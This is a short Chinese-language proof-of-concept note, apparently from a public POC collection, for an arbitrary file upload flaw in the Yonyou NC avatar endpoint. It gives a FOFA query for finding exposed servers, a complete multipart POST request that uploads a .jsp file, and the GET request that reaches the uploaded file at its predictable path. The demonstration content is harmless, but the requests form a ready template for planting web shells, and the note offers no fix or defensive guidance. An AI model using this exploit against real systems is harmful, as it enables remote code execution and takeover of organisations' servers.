## 用友NC-avatar接口存在文件上传漏洞

## fofa
```
body="/Client/Uclient/UClient.exe"
```

## poc
```
POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
User-Agent: Mozilla/5.0 

------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="111.jsp"
Content-Type: application/octet-stream

3999
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```

![image](https://github.com/wy876/POC/assets/139549762/3776732e-df39-4d9e-9f6b-1ffcbd7c2d11)


文件上传路径

![image](https://github.com/wy876/POC/assets/139549762/c6a16b38-752c-4a54-88a4-a04b88109145)

```
GET /uapim/static/pages/photo/1/1.1713358789182.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
```

![image](https://github.com/wy876/POC/assets/139549762/b6abe3ba-35e6-410a-a265-9b2e57d7d922)

`http://192.168.63.129:8088/uapim/static/pages/photo/1/1.1713358789182.jsp`

